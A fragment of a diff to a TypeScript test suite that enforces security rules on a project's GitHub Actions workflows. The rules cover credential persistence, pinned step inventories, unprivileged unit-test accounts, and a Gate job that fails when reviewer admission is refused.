+                `nightly-evidence-report.yml job ${job} step ${step} must check out with persist-credentials: false`
+            );
+        }
+
+        const bypassedValidation = cloneWorkflows('nightly evidence validation removed');
+        removeStepNamed(
+            jobAt(bypassedValidation.nightlyEvidenceReporter, 'validate'),
+            'Validate independent run, artifact, jobs and CodeQL analysis'
+        );
+        expect(() => assertStepInventory(bypassedValidation)).toThrow(
+            'nightly-evidence-report.yml job validate steps drifted from the pinned inventory'
+        );
+
+        const counterfeitGate = cloneWorkflows('nightly evidence Gate name');
+        jobAt(counterfeitGate.nightlyEvidenceReporter, 'publish').name = 'Gate';
+        expect(surface(counterfeitGate)).toThrow('nightly-evidence-report.yml job publish must not be named Gate');
+    });
+
     it('refuses a workflows directory that drifts from the recorded file inventory', () => {
         expect(() =>
             assertWorkflowFileInventory(readRecordedWorkflowSnapshot(repositoryRoot), repositoryRoot)
@@ -4754,15 +3815,15 @@ export -f sudo timeout sleep apt-get
         expect(() => assertPnpmBeforeNodeOrder(heavyWorkflow)).not.toThrow();
 
         const missingPnpmSetup = asRecord(structuredClone(nightly), 'missing pnpm setup nightly');
-        removeStepNamed(jobAt(missingPnpmSetup, 'unit'), PNPM_SETUP_STEP);
+        removeStepNamed(jobAt(missingPnpmSetup, 'build'), PNPM_SETUP_STEP);
         expect(() => assertPnpmBeforeNodeOrder(missingPnpmSetup)).toThrow(
-            `unit must run ${PNPM_SETUP_STEP} immediately before ${NODE_SETUP_STEP} when setup-node caches pnpm`
+            `build must run ${PNPM_SETUP_STEP} immediately before ${NODE_SETUP_STEP} when setup-node caches pnpm`
         );
 
         const reversedSetup = asRecord(structuredClone(nightly), 'reversed pnpm setup nightly');
-        swapStepsNamed(jobAt(reversedSetup, 'unit'), PNPM_SETUP_STEP, NODE_SETUP_STEP);
+        swapStepsNamed(jobAt(reversedSetup, 'build'), PNPM_SETUP_STEP, NODE_SETUP_STEP);
         expect(() => assertPnpmBeforeNodeOrder(reversedSetup)).toThrow(
-            `unit must run ${PNPM_SETUP_STEP} immediately before ${NODE_SETUP_STEP} when setup-node caches pnpm`
+            `build must run ${PNPM_SETUP_STEP} immediately before ${NODE_SETUP_STEP} when setup-node caches pnpm`
         );
 
         const reversedDeploySetup = asRecord(structuredClone(nightly), 'reversed deploy pnpm setup nightly');
@@ -5000,8 +4061,14 @@ export -f sudo timeout sleep apt-get
         }
     });
 
-    it('runs required unit install and shards through a fresh unprivileged identity', () => {
-        const unit = jobAt(validationWorkflow, 'unit');
+    // The guard storage specs require an account with no uninspectable same-UID
+    // process; the hosted runner account has them, so every unit shard route,
+    // scheduled or required, enters the fresh unprivileged account.
+    it.each([
+        ['validation.yml', validationWorkflow],
+        ['nightly.yml', nightly],
+    ])('runs %s unit install and shards through a fresh unprivileged identity', (_file, workflow) => {
+        const unit = jobAt(workflow, 'unit');
         const prepare = stepNamed(unit, 'Prepare isolated unit account');
         const install = stepNamed(unit, 'Install dependencies');
         const shard = stepNamed(unit, 'Run shard');
@@ -5029,9 +4096,11 @@ export -f sudo timeout sleep apt-get
             'persist-credentials': false,
         });
         expect(recordAt(shard, 'env').VITEST_MAX_WORKERS).toBe(4);
+        // One shard's failure must not cancel the others' evidence.
+        expect(recordAt(unit, 'strategy')['fail-fast']).toBe(false);
     });
 
-    it('fetches immutable measurement provenance history only in the unit matrix', () => {
+    it('fetches provenance history in static validation and the unit matrix', () => {
         expect(() => assertUnitProvenanceHistory(validationWorkflow)).not.toThrow();
 
         const shallowUnit = asRecord(structuredClone(validationWorkflow), 'shallow unit validationWorkflow');
@@ -5329,8 +4398,16 @@ export -f sudo timeout sleep apt-get
 
     it('requires selected PR and browser checks to succeed, including after cancellation', () => {
         const gateScript = assertGateContract(workflow, 'gate', 'Gate', GATE_CONDITION);
-        const requiredResults = (codeql: 'true' | 'false', overrides: Record<string, JobResult> = {}) =>
+        const requiredResults = (
+            codeql: 'true' | 'false',
+            overrides: Record<string, JobResult> = {},
+            admitted: 'true' | 'false' = 'true'
+        ) =>
             JSON.stringify({
+                admission: {
+                    result: overrides.admission ?? 'success',
+                    outputs: { admitted, reason: 'the reviewer App has not approved head abc' },
+                },
                 scope: {
                     result: overrides.scope ?? 'success',
                     outputs: { browser: 'true', 'browser-ai': 'false', codeql },
@@ -5341,11 +4418,28 @@ export -f sudo timeout sleep apt-get
             });
         expect(runResultsGuard(gateScript, requiredResults('true'))).toBe(0);
         expect(runResultsGuard(gateScript, requiredResults('false'))).toBe(0);
-        for (const dependency of ['scope', 'validation', 'affected', 'codeql']) {
+        for (const dependency of ['admission', 'scope', 'validation', 'affected', 'codeql']) {
             for (const result of ['failure', 'cancelled', 'skipped'] as const) {
                 expect(runResultsGuard(gateScript, requiredResults('true', { [dependency]: result }))).not.toBe(0);
             }
         }
+        // A refused admission skips every heavy job; Gate must fail, never pass on the skips, and say why.
+        const refused = JSON.stringify({
+            admission: {
+                result: 'success',
+                outputs: { admitted: 'false', reason: 'the reviewer App has not approved head abc' },
+            },
+            scope: { result: 'skipped', outputs: {} },
+            validation: { result: 'skipped' },
+            affected: { result: 'skipped' },
+            codeql: { result: 'skipped' },
+        });
+        expect(runResultsGuard(gateScript, refused)).not.toBe(0);
+        expect(
+            spawnSync('bash', ['-c', gateScript], { encoding: 'utf8', env: { ...process.env, RESULTS: refused } })
+                .stdout
+        ).toMatch(/^::error title=Gate not admitted::the reviewer App has not approved head abc\n/u);
+        expect(runResultsGuard(gateScript, requiredResults('true', {}, 'false'))).not.toBe(0);
         expect(runResultsGuard(gateScript, requiredResults('false', { codeql: 'success' }))).not.toBe(0);
         expect(
             runResultsGuard(gateScript, requiredResults('true').replace('"browser":"true"', '"browser":""'))
